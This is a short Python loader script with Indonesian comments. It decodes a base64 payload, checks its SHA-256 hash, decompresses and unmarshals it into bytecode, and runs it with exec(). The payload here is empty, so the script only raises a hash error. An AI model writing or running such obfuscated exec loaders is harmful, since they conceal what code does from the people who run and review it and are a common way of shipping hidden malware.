import os, base64, zlib, marshal, hashlib, sys

def clear_screen():
    os.system('cls' if os.name=='nt' else 'clear')

def main():
    clear_screen()
    # Load payload
    payload = base64.b64decode("")
    # Verifikasi SHA256
    if hashlib.sha256(payload).hexdigest() != "4e78766f40ba02fd62e8228c9cdcad2eeb37cf02e357072625c9d88042ee041a":
        raise ValueError("hash mismatch! File mungkin telah dimodifikasi.")
    # Decode & exec
    code = marshal.loads(zlib.decompress(payload))
    exec(code)

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        sys.exit(f"Error: {e}")
